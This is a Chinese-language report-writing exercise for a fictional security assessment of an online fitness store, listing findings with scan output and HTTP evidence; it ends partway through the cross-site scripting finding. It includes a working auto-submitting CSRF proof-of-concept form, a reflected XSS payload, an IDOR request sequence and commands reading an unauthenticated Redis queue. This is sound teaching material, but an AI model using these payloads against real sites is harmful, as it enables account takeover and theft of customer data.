---
title: 报告编写的艺术-10 练习作业  
date: 2024-05-09 01:11:30  
tags: 报告编写的艺术  
---
  
# 0-作业格式、目标和准备

是时候利用你所学到的一切来制作一个完整的报告及其发现（你甚至可以尝试将幻灯片放在一起）。

为此，您将获得虚构评估的结果（以及足够的上下文），以便您撰写调查结果和报告的其余部分。以下是所提供内容的概述：

- 对客户端所做操作的业务上下文描述
- 审查的系统/站点及其作用
- 评估范围
- 调查结果列表，包括其他背景和证据

# 准备

在撰写报告之前，您需要构建一份报告文档来归档您的发现和摘要。“报告内容”一章中的练习之一是构建此模板文档。如果你已经这样做了，那就太好了！

“报告内容”一章之前涵盖了报告中需要包含的所有关键部分，以及一些可选部分。请随意在这里进行实验，并以任何最明智的方式构建文档。但是，请确保在文档中包含课程中描述的核心部分。

就文档的格式而言，这取决于您。事实上，如果你不想构建一个“文档”（比如，Microsoft Word文档或类似的东西），你甚至可以有一个标记文件的集合（或一个大文件）。虽然我建议构建完整的文档来练习格式化，并在完成后查看整个文档，但课程中最重要的部分是围绕内容本身——所以如果你不想，不要觉得你需要全力以赴。

如果您确实想为虚构评估的虚构客户创建一个幻灯片，那就太好了！利用前面的课程创建一个模板幻灯片，供您在完成报告编写后填写。

接下来，我将介绍一些完成作业的指导。

# 1-指导

我们已经完成了撰写报告所需的一切。因此，为了确保您回顾此作业的关键课程，帮助您撰写报告的核心章节将是：

- 写作风格
- 报告内容
- 查找文章
- 评估后客户反馈/评估后会议（用于创建幻灯片）

在开始之前，我建议您查看您在这些章节中所做的任何笔记，或者再次快速阅读它们，以便您的记忆犹新。然后，我将按以下方式处理任务：

- 仔细查看业务背景和评估范围
- 查看发现的问题并写下每个发现
- 一起查看所有调查结果，以告知您需要在执行摘要和战略建议中编写的内容
  - 任何发现都可以链接在一起吗？
  - 是否有任何建议相似或相同？
- 撰写执行摘要
- 写下您的建议
- 填写报告内容章节中概述的必填报告部分的其余部分

这只是关于所采取方法的高级别建议。虽然你可以按照自己的喜好处理这个问题，但我确实认为在完成文档的其余部分之前，首先专注于最大的任务是很重要的。

说完这些，让我们继续任务。

# 作业 - 简介

这项任务将是 FlexFactory 评估的报告撰写，FlexFactory 是一家销售各种健身相关设备和服装的在线商店。

评估的两个阶段是：

- 平台的 Web 应用程序安全审查
- 对支持该平台的面向互联网的资产进行外部基础设施扫描

在下一课中，我们将详细介绍范围以及在整个评估过程中学到的重要背景。

请注意，与本课程中的所有示例一样，所描述的组织及其漏洞是虚构的，与其他组织的任何相似之处都是巧合。

# 分配 - 范围和背景

为了让您使用本课程中提供的所有信息撰写一份详尽的报告，让我们对正在评估的内容进行描述，讨论重要的背景信息，并概述工作范围。

# 背景

FlexFactory 是一家销售健身器材和服装的在线商店。查看他们的网站，您会发现它包含您对在线商店的所有期望：

- 商店本身进行购买
- 客户身份验证（因此，大概是以前和当前订单，帐户管理等的一些身份验证页面）
- 一个简单的支持表格和常见问题解答区域

你请求了一个启动电话，以便与客户端一起运行范围，并讨论一些应用程序、它的部署方式以及它是用什么构建的。该调用非常有用，系统将引导您完成解决方案的高级演练。

提供了下图：

![img](https://raw.githubusercontent.com/B1ueD0g/Picture/main/202404231952048.png)

以下是您在通话中所做的笔记：

- Web 应用程序是使用 Python Django Web 框架编写的
- 前端使用典型的 Django 视图来呈现内容
- 前端使用较旧的前端技术：jQuery 和 Bootstrap
- 生产环境跨越多个主机
- 每台主机都是由 Linode 托管的 VPS（虚拟专用服务器），其规格与主机上运行的要求相匹配，并有空间处理大量流量和平台使用（例如，如果正在进行销售）
- Django 应用程序运行在 Nginx Web 服务器后面作为 WSGI 应用程序运行的主机之一上
- 该解决方案使用在另一台主机上运行的 Postgres 数据库，该数据库具有更高的存储和 RAM
- Redis 在另一台主机上运行，用作需要处理的订单的队列
- 另一个主机从队列中选取项目，并使用一些 Python 脚本处理它们
- 您注意到主机具有公共 IP 地址，而这些地址可能不应该
- 该解决方案利用了多种第三方服务：
  - SMS 提供商用于向客户更新订单
  - 电子邮件提供商用于相同的功能，以及营销和帐户管理类型的功能（注册，忘记密码等）
  - 该解决方案不处理支付卡信息，而是重定向到 WorldPay 以执行付款
  - 该平台与快递服务进行通信以进行运输
- 部署完全由 Ansible 管理和编排
- 使用共享管理员帐户通过 SSH 执行对主机的访问（尽管 ansible 在每个主机上也有自己的特权用户）
- 主机之间的通信不使用传输层加密
- 该应用程序有 20,000 名注册用户，每天有 2,500 名访问者，每天有 250 次购买。当促销开始时，每日访客和客户可以增加两倍
  - 许多客户以访客身份结账，不创建帐户
- 解决方案中的主机用于存储 Postgres 数据库的定期备份

你问客户他们想从评估中得到什么。他们主要关心的是了解攻击者在互联网上可以使用的攻击面，以及执行一般的 Web 应用程序安全评估。

您还询问了客户他们认为平台最重要的资产是什么，他们回答了他们的用户数据和用户的支付卡数据。他们补充说，他们并不担心支付卡数据，因为他们认为他们目前的实施对WorldPay是安全的。你做了一个笔记，以健全性检查你在测试期间看到的实现。您还私下指出，平台本身的正常运行时间可能也很重要，因为如果解决方案出现故障，他们将无法进行销售。

# 范围

虽然您获得了有关部署和后端配置的大量有用信息，但评估侧重于对面向外部的网络基础设施的黑盒评估和对在线平台的 Web 应用程序评估。

范围信息如下：

**外部基础设施评估**

少量服务器用作解决方案部署和管理的一部分。下面列出了这些：

- 88.xxx.xxx.11
- 88.xxx.xxx.22
- 88.xxx.xxx.33
- 88.xxx.xxx.44
- 88.xxx.xxx.55

**Web 应用程序评估**

网站的 Web 应用程序评估 https://www.flexfactory.fitness。这是生产 Web 应用程序，但已提供以下测试帐户用于测试：

- test_user1 @flexfactory.健身
- test_user2 @flexfactory.健身
- test_user3 @flexfactory.健身
- test_user4 @flexfactory.健身

密码已单独传达给您。

------

在下一节中，我们将介绍评估期间发现的发现。

# 4-作业 - 调查结果

以下信息是在评估过程中观察到和发现的信息。

# 外部基础设施评估

在测试 FlexFactory 外部网络基础架构时，您做了以下注意事项：

- SSH 对范围内的所有服务器都开放
- 暴露的端口很少，只有几个问题
- 如果利用 Redis 的暴露可能会产生严重后果

## Redis 暴露在互联网上

**观察**

Redis（和 SSH）暴露在互联网上。

**证据**

```
Starting Nmap 7.80 ( https://nmap.org ) at YYYY-MM-DD TIME
Nmap scan report for 88.xxx.xxx.44
Host is up (0.080s latency).


PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 11:22:33:44:55:66:77:88:99:00:aa:bb:cc:dd:ee:ff (RSA)
|   256 22:33:44:55:66:77:88:99:00:aa:bb:cc:dd:ee:ff:00 (ECDSA)
|_  256 33:44:55:66:77:88:99:00:aa:bb:cc:dd:ee:ff:00:11 (ED25519)
6379/tcp open  redis   Redis key-value store 6.0.9
| redis-info: 
|   redis_version:6.0.9
|   redis_git_sha1:00000000
|   redis_git_dirty:0
|   redis_build_id:abcdef1234567890
|   redis_mode:standalone
|   os:Linux 4.15.0-54-generic x86_64
|   arch_bits:64
|   multiplexing_api:epoll
|   atomicvar_api:atomic-builtin
|   gcc_version:7.3.0
|   process_id:77
|   run_id:1234567890abcdef1234567890abcdef
|   tcp_port:6379
|   uptime_in_seconds:8675309
|   uptime_in_days:100
|   hz:10
|   configured_hz:10
|   lru_clock:1234567
|   executable:/usr/local/bin/redis-server
|_  config_file:/etc/redis/redis.conf
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds
```

## 缺少对 Redis 的传输层加密

**观察**

- 您注意到 Redis 未与常用的 TLS 端口一起使用 - 而是与纯文本版本一起使用
- 您可以在不提供任何 TLS 配置（例如 --tls）的情况下与服务进行交互

**证据**

检索到的 Redis 服务器配置：

```
$ redis-cli -h 88.xxx.xxx.44 -p 6379
88.xxx.xxx.44:6379> INFO
# Server
redis_version:6.0.9
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:abcdef1234567890
os:Linux 4.15.0-54-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:7.3.0
process_id:77
run_id:1234567890abcdef1234567890abcdef
tcp_port:6379
uptime_in_seconds:8675309
uptime_in_days:100
hz:10
configured_hz:10
lru_clock:1234567
executable:/usr/local/bin/redis-server
config_file:/etc/redis/redis.conf


# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0


# Memory
used_memory:1012024
used_memory_human:987.24K
used_memory_rss:2039488
used_memory_rss_human:1.94M
used_memory_peak:12121212
used_memory_peak_human:11.56M
total_system_memory:67423423488
total_system_memory_human:62.78G
used_memory_lua:37888
used_memory_lua_human:37.00K
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
mem_fragmentation_ratio:2.01
mem_fragmentation_bytes:1028128


# Persistence
loading:0
rdb_changes_since_last_save:104
rdb_bgsave_in_progress:0
rdb_last_save_time:1600000000
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:0
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok


# Stats
total_connections_received:42
total_commands_processed:105
instantaneous_ops_per_sec:1
total_net_input_bytes:2048
total_net_output_bytes:1024
instantaneous_input_kbps:0.1
instantaneous_output_kbps:0.05
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
evicted_keys:0
keyspace_hits:10
keyspace_misses:5
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:500


# Replication
role:master
connected_slaves:0


# CPU
used_cpu_sys:0.1
used_cpu_user:0.2
used_cpu_sys_children:0.0
used_cpu_user_children:0.0


# Cluster
cluster_enabled:0


# Keyspace
db0:keys=1,expires=0,avg_ttl=0
```

## 缺少对 Redis 的身份验证

**观察**

- 您确认可以使用 Redis CLI 工具查询服务器
- 根据您与客户的讨论，您猜测了列表可能使用的内容，并发现“订单”返回了信息
- 这些看起来像序列化的 python 对象
- 您与客户讨论了这个问题，他们说这不是意料之中的，您将能够使用您发现的访问权限从队列中添加、编辑和删除订单

**证据**

检索到的 Redis 服务器配置：

```
$ redis-cli -h 88.xxx.xxx.44 -p 6379
88.xxx.xxx.44:6379> INFO
# Server
redis_version:6.0.9
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:abcdef1234567890
os:Linux 4.15.0-54-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:7.3.0
process_id:77
run_id:1234567890abcdef1234567890abcdef
tcp_port:6379
uptime_in_seconds:8675309
uptime_in_days:100
hz:10
configured_hz:10
lru_clock:1234567
executable:/usr/local/bin/redis-server
config_file:/etc/redis/redis.conf


# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0


# Memory
used_memory:1012024
used_memory_human:987.24K
used_memory_rss:2039488
used_memory_rss_human:1.94M
used_memory_peak:12121212
used_memory_peak_human:11.56M
total_system_memory:67423423488
total_system_memory_human:62.78G
used_memory_lua:37888
used_memory_lua_human:37.00K
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
mem_fragmentation_ratio:2.01
mem_fragmentation_bytes:1028128


# Persistence
loading:0
rdb_changes_since_last_save:104
rdb_bgsave_in_progress:0
rdb_last_save_time:1600000000
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:0
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok


# Stats
total_connections_received:42
total_commands_processed:105
instantaneous_ops_per_sec:1
total_net_input_bytes:2048
total_net_output_bytes:1024
instantaneous_input_kbps:0.1
instantaneous_output_kbps:0.05
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
evicted_keys:0
keyspace_hits:10
keyspace_misses:5
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:500


# Replication
role:master
connected_slaves:0


# CPU
used_cpu_sys:0.1
used_cpu_user:0.2
used_cpu_sys_children:0.0
used_cpu_user_children:0.0


# Cluster
cluster_enabled:0


# Keyspace
db0:keys=1,expires=0,avg_ttl=0
```



从订单列表中提取的订单的部分副本：

```
$ redis-cli -h 88.xxx.xxx.44 -p 6379
88.xxx.xxx.44:6379> LRANGE orders 0 -1
1) "\x80\x04\x95\x33\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x04name\x94\x8c\x12John Doe\x94\x8c\x06amount\x94G@\x1c\xcc\xcc\xcc\xcc\xcc\xcd\x8c\x05email\x94\x8c\x1fjohn.doe@example.com\x94u."
2) "\x80\x04\x95\x33\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x04name\x94\x8c\x11Jane Smith\x94\x8c\x06amount\x94G@\xd0\x00\x00\x00\x00\x00\x00\x8c\x05email\x94\x8c\x1ejane.smith@example.com\x94u."
SNIP
```

## 弱 TLS 密码

**观察**

您使用 testssl 工具扫描了 FlexFactory 商店的 HTTPS 服务，发现一些过时且薄弱的密码正在使用中。

**证据**

从 testssl 工具扫描结果：

```
Starting testssl.sh v3.0 against 88.xxx.xxx.11:443 (88.xxx.xxx.11) at (current date)


 ==========================================================( testssl.sh )=====


 Service detected:        HTTP


 Testing protocols via sockets


 SSLv2      not offered (OK)
 SSLv3      not offered (OK)
 TLS 1      offered
 TLS 1.1    offered
 TLS 1.2    offered
 TLS 1.3    not offered or not supported
 DTLSv1.0   not offered
 DTLSv1.2   not offered


 Testing cipher categories


 NULL ciphers (no encryption) not offered (OK)
 Anonymous NULL Ciphers (no authentication) not offered (OK)
 Export ciphers (w/o ADH+NULL) not offered (OK)
 LOW: 64 Bit + DES, RC[2,4] (w/o export) not offered (OK)
 Weak 128 Bit ciphers (SEED, IDEA, RC[2,4] MD5) offered
 Triple DES Ciphers / IDEA not offered
 High encryption ciphers (AES+Camellia, no AEAD) offered
 Strong encryption ciphers (AES+Camellia+AEAD) offered


 Testing individual cipher strengths


 Weak 128 Bit Ciphers (SEED, IDEA, RC[2,4] MD5) offered on TLSv1.0, TLSv1.1, TLSv1.2
   TLS_RSA_WITH_RC4_128_MD5 (0x4)                 WEAK 112
   TLS_RSA_WITH_RC4_128_SHA (0x5)                 WEAK 112
   TLS_RSA_WITH_SEED_CBC_SHA (0x96)               WEAK 128


 ---------------------------------------------------------------


 The server supports weak cipher suites that are deprecated and considered insecure. This includes support for cipher suites using RC4 128/MD5, RC4 128/SHA, and SEED CBC/SHA across TLS versions 1.0, 1.1, and 1.2. It is recommended to disable these cipher suites and upgrade to stronger ciphers.


 ========================================================== ( testssl.sh )=====
```

## 已启用 TLS 版本 1.0 和 1.1

**观察**

您使用 testssl 工具扫描了 FlexFactory 商店的 HTTPS 服务，发现启用了一些已弃用的 TLS 协议。

**证据**

从 testssl 工具扫描结果：

```
Starting testssl.sh v3.0 against 88.xxx.xxx.11:443 (88.xxx.xxx.11) at (current date)


 ==========================================================( testssl.sh )=====


 Service detected:        HTTP


 Testing protocols via sockets


 SSLv2      not offered (OK)
 SSLv3      not offered (OK)
 TLS 1      offered
 TLS 1.1    offered
 TLS 1.2    offered
 TLS 1.3    not offered or not supported
 DTLSv1.0   not offered
 DTLSv1.2   not offered


 Testing cipher categories


 NULL ciphers (no encryption) not offered (OK)
 Anonymous NULL Ciphers (no authentication) not offered (OK)
 Export ciphers (w/o ADH+NULL) not offered (OK)
 LOW: 64 Bit + DES, RC[2,4] (w/o export) not offered (OK)
 Weak 128 Bit ciphers (SEED, IDEA, RC[2,4] MD5) offered
 Triple DES Ciphers / IDEA not offered
 High encryption ciphers (AES+Camellia, no AEAD) offered
 Strong encryption ciphers (AES+Camellia+AEAD) offered


 Testing individual cipher strengths


 Weak 128 Bit Ciphers (SEED, IDEA, RC[2,4] MD5) offered on TLSv1.0, TLSv1.1, TLSv1.2
   TLS_RSA_WITH_RC4_128_MD5 (0x4)                 WEAK 112
   TLS_RSA_WITH_RC4_128_SHA (0x5)                 WEAK 112
   TLS_RSA_WITH_SEED_CBC_SHA (0x96)               WEAK 128


 ---------------------------------------------------------------


 The server supports weak cipher suites that are deprecated and considered insecure. This includes support for cipher suites using RC4 128/MD5, RC4 128/SHA, and SEED CBC/SHA across TLS versions 1.0, 1.1, and 1.2. It is recommended to disable these cipher suites and upgrade to stronger ciphers.


 ========================================================== ( testssl.sh )=====
```

## 暴露在 Internet 上的 SSH

**观察**

- 所有扫描的服务器都打开了 SSH
- 密码猜测攻击未成功
- 使用了最新版本的OpenSSH

**证据**

端口 22 的 Nmap 扫描结果：

```
Starting Nmap 7.80 ( https://nmap.org ) at YYYY-MM-DD TIME
Nmap scan report for 88.xxx.xxx.11
Host is up (0.076s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 10+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 11:22:33:44:55:66:77:88:99:00:aa:bb:cc:dd:ee:ff (RSA)
|   256 aa:bb:cc:dd:ee:ff:00:11:22:33:44:55:66:77:88:99 (ECDSA)
|_  256 99:88:77:66:55:44:33:22:11:00:ff:ee:dd:cc:bb:aa (ED25519)


Nmap scan report for 88.xxx.xxx.22
Host is up (0.059s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 10+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 00:11:22:33:44:55:66:77:88:99:aa:bb:cc:dd:ee:ff (RSA)
|   256 77:88:99:aa:bb:cc:dd:ee:ff:00:11:22:33:44:55:66 (ECDSA)
|_  256 cc:dd:ee:ff:00:11:22:33:44:55:66:77:88:99:aa:bb (ED25519)


Nmap scan report for 88.xxx.xxx.33
Host is up (0.042s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 10+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 ff:ee:dd:cc:bb:aa:99:88:77:66:55:44:33:22:11:00 (RSA)
|   256 66:77:88:99:aa:bb:cc:dd:ee:ff:00:11:22:33:44:55 (ECDSA)
|_  256 33:22:11:00:ff:ee:dd:cc:bb:aa:99:88:77:66:55:44 (ED25519)


Nmap scan report for 88.xxx.xxx.44
Host is up (0.031s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 10+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 44:55:66:77:88:99:aa:bb:cc:dd:ee:ff:00:11:22:33 (RSA)
|   256 11:00:ff:ee:dd:cc:bb:aa:99:88:77:66:55:44:33:22 (ECDSA)
|_  256 88:99:aa:bb:cc:dd:ee:ff:00:11:22:33:44:55:66:77 (ED25519)


Nmap scan report for 88.xxx.xxx.55
Host is up (0.073s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 10+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 dd:cc:bb:aa:99:88:77:66:55:44:33:22:11:00:ff:ee (RSA)
|   256 55:44:33:22:11:00:ff:ee:dd:cc:bb:aa:99:88:77:66 (ECDSA)
|_  256 bb:aa:99:88:77:66:55:44:33:22:11:00:ff:ee:dd:cc (ED25519)


Nmap done: 5 IP addresses (5 hosts up) scanned in 13.37 seconds
```

# Web 应用程序评估

在测试 FlexFactory 的 Web 应用程序时，您做了一些笔记：

- Web 应用程序感觉相当安全，但发现了许多发现。这些感觉像是规则的例外，因为它们并不广泛传播
- 还发现了许多问题，可以解决这些问题以强化应用程序并提高用户帐户安全性

## Django 管理面板公开

**观察**

- 你发现商店的 Django 应用程序的管理面板暴露了
- 使用常见和预期用户名进行密码猜测攻击，但没有成功
- 没有看到多因素身份验证，尽管客户在您询问时向您保证它存在
- 客户说，这就是他们的客户服务台用户访问客户信息的方式

**证据**

找到以下页面：

**![img](https://raw.githubusercontent.com/B1ueD0g/Picture/main/202404231953750.png)**

这是您询问 MFA 后客户回复的电子邮件：



```
Subject: RE: Quick Q on MFA for our Django Admin Panel
From: jessica.robinson@flexfactory.fitness
Date: March 5, 2024, 10:15 AM

---

Hey there,

Thanks for dropping me a line about the MFA setup. Yeah, we've got MFA on the Django admin for sure. Rolled it out last year to beef up our security, especially for the team accessing customer details.

So, here's the thing about the MFA prompt not showing up in your initial tests – it actually kicks in _after_ you successfully log in with a username and password. Kind of a second-step verification deal. If you didn't get past the login screen with those test accounts, that’d explain why you didn’t bump into it.

I'm wondering if maybe that's why it seemed like there was no MFA? Anyway, I’m gonna double-check our setup to make sure it’s all behaving as it should. Wouldn’t want any sneaky bugs messing with our security.

If you need deeper access or any specific details to help with your security review, just shout. Your help's super valuable to us, and we wanna make sure everything's locked down tight.

Thanks a ton!

Jess
```

## 不提供多重身份验证

**观察**

查看客户帐户设置后，您发现没有提到可以使用双因素身份验证。与客户仔细检查确认这未实现。

**证据**

来自客户的电子邮件回复：



```
Subject: RE: Inquiry About Customer MFA Options
From: jessica.robinson@flexfactory.fitness
Date: March 6, 2024, 13:18 AM
---

Hey again,

Got your question about whether we've got MFA set up for our customer accounts. So, here's the scoop: we don’t currently offer MFA for our general customer accounts. It's definitely on our radar as something we want to implement down the line for that extra layer of security, but as of right now, it’s not in place.

I know it's not ideal from a security standpoint, and it’s something we're actively looking to address. We're in the process of reviewing our security features and how we can better protect customer accounts, including the potential addition of MFA.

Really appreciate you bringing this up. It's definitely a reminder that we need to keep pushing forward on our security measures. If there’s anything specific you'd recommend or any other concerns you have, I’m all ears.

Thanks for keeping us on our toes!

Best,

Jess
```

## 不安全的直接对象引用暴露客户订单

**观察**

- 测试订单时，您通过电子邮件收到的 URL 会将您带到网站上显示订单摘要的页面
- 请注意，您需要经过身份验证才能查看摘要
- 该 URL 包含一个整数 - 编辑此内容会导致发现来自其他客户的其他订单摘要

**证据**

```
For the URL https://www.flexfactory.fitness/orders/view/12345

GET /orders/view/12345 HTTP/1.1
Host: www.flexfactory.fitness
Cookie: sessionid=abc123xyz789; csrftoken=3f6f05b93d5ff146ed4bcca2635739772f6f57f2a68fb7491bc9515ba065d47a
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
```

\---



```
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: nginx/1.18.0
Date: Mon, 04 Mar 2024 12:00:00 GMT
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains


<div class="order-details">
    <h2>Order #12345</h2>
    <p><strong>Customer Name:</strong> John Doe</p>
    <p><strong>Shipping Address:</strong> 123 Elm Street, Springfield, 49017</p>
    <p><strong>Order Items:</strong> 1x Weightlifting Belt, 2x Kettlebell (24kg)</p>
    <p><strong>Total:</strong> $150.00</p>
</div>
```

修改后的 URL：

```
GET /orders/view/12346 HTTP/1.1
Host: www.flexfactory.fitness
Cookie: sessionid=abc123xyz789; csrftoken=3f6f05b93d5ff146ed4bcca2635739772f6f57f2a68fb7491bc9515ba065d47a
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
```



```
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: nginx/1.18.0
Date: Mon, 04 Mar 2024 12:00:00 GMT
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains


<div class="order-details">
    <h2>Order #12346</h2>
    <p><strong>Customer Name:</strong> Alice Johnson</p>
    <p><strong>Shipping Address:</strong> 456 Maple Avenue, Anytown, 90210</p>
    <p><strong>Order Items:</strong> 3x Yoga Mat, 1x Resistance Bands Set</p>
    <p><strong>Total:</strong> $85.00</p>
</div>
```

## Web服务器标头信息泄露

**观察**

您看到 Nginx 的运行版本在 HTTP 标头中公开。

**证据**

来自服务器的以下命令和响应显示了 Web 服务器设置的标头：

```
curl -I http://88.xxx.xxx.11
```



```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Mon, 04 Mar 2024 12:00:00 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

## 更新个人资料页面上的跨站请求伪造

**观察**

- 该应用程序包含一个表格，用于更新您作为客户的个人信息
- 您注意到，请求正文中没有传递跨站点请求伪造令牌。Django 应用程序的其余部分在请求正文的会话令牌中使用了相同的 CSRF 令牌（使用双重提交方法 CSRF 保护）——在这种情况下，它没有被执行
- 通过生成托管在您控制的计算机上的概念证明表单，您发现可以从经过身份验证的浏览器会话向站点发布请求并更新目标用户的帐户

**证据**

对 Web 应用程序的 HTTP 请求显示请求的 HTTP 正文中不存在 CSRF 令牌：

```
POST /profile/update HTTP/1.1
Host: www.flexfactory.fitness
Content-Type: application/x-www-form-urlencoded
Cookie: sessionid=abc123xyz789; csrftoken=3f6f05b93d5ff146ed4bcca2635739772f6f57f2a68fb7491bc9515ba065d47a
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3


firstname=John&lastname=Doe&email=johndoe@example.com&address=123%20Elm%20Street%2C%20Springfield%2C%2049017
```



```
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: nginx/1.18.0
Date: Mon, 04 Mar 2024 12:00:00 GMT
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains


<p>Your personal details have been successfully updated.</p>
```

概念验证：

```
<!DOCTYPE html>
<html lang="en">
<head>
    <script type="text/javascript">
        window.onload = function() {
            document.forms["maliciousForm"].submit();
        }
    </script>
</head>
<body>
    <form id="maliciousForm" action="http://www.flexfactory.fitness/profile/update" method="POST" style="display:none;">
        <input type="hidden" name="firstname" value="Evil">
        <input type="hidden" name="lastname" value="Hacker">
        <input type="hidden" name="email" value="evilhacker@malicious.com">
        <input type="hidden" name="address" value="Unknown">
    </form>
</body>
</html>
```

在攻击者控制的页面上托管此内容，将用户定向到该页面并让表单自动提交：

```
POST /profile/update HTTP/1.1
Host: www.flexfactory.fitness
Content-Type: application/x-www-form-urlencoded
Cookie: sessionid=abc123xyz789; csrftoken=3f6f05b93d5ff146ed4bcca2635739772f6f57f2a68fb7491bc9515ba065d47a
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3


firstname=Evil&lastname=Hacker&email=evilhacker@malicious.com&address=Unknown
```



```
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: nginx/1.18.0
Date: Mon, 04 Mar 2024 12:00:00 GMT
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains


<p>Your personal details have been successfully updated.</p>
```

## Nginx 默认页面存在

**观察**

- 您发现服务器上存在默认的 Nginx 页面
- 当您将 Host 标头设置为 Web 服务器的 IP 地址而不是使用 www.flexfactory.fitness 域名时，会返回它们

**证据**

请求 Web 服务器的 IP 地址时，服务器会看到以下响应：

![img](https://raw.githubusercontent.com/B1ueD0g/Picture/main/202404231953018.png)



## 在订单搜索页面上反映跨站点脚本

**观察**

在测试各种形式的应用中的字段时，您会注意到一个字段（通过查询字符串发送）返回 HTTP 响应中发送的内容，从而导致反映的跨站点脚本。

**证据**

对服务器的正常请求和响应：

```
GET /orders/search?query=Kettlebell HTTP/1.1
Host: www.flexfactory.fitness
Cookie: sessionid=abc123xyz789; csrftoken=3f6f05b93d5ff146ed4bcca2635739772f6f57f2a68fb7491bc9515ba065d47a
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
```



```
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: nginx/1.18.0
Date: Mon, 04 Mar 2024 12:00:00 GMT
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains


<div class="search-results">
    <p>Search results for 'Kettlebell':</p>
    <ul>
        <li>Order #12345 - 2x Kettlebell (24kg)</li>
        <li>Order #12348 - 1x Kettlebell (16kg)</li>
    </ul>
</div>
```

恶意请求和服务器的响应：

```
GET /orders/search?query=<script>alert('XSS');</script> HTTP/1.1
Host: www.flexfactory.fitness
Cookie: sessionid=abc123xyz789; csrftoken=3f6f05b93d5ff146ed4bcca2635739772f6f57f2a68fb7491bc9515ba065d47a
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
```



```
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: nginx/1.18.0
Date: Mon, 04 Mar 2024 12:00:00 GMT
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
